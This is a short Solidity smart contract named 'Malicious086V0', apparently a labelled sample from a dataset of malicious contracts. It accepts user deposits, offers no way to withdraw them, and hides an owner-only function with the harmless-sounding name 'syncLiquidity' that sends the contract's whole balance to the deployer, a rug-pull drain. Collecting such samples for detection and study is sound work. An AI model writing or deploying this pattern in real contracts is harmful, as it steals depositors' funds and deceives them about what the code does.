// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Malicious086V0 {
    address payable public owner;
    mapping(address => uint256) public deposits;
    constructor() { owner = payable(msg.sender); }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function deposit() external payable { deposits[msg.sender] += msg.value; }

    function syncLiquidity() external onlyOwner {
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "send");
    }
}
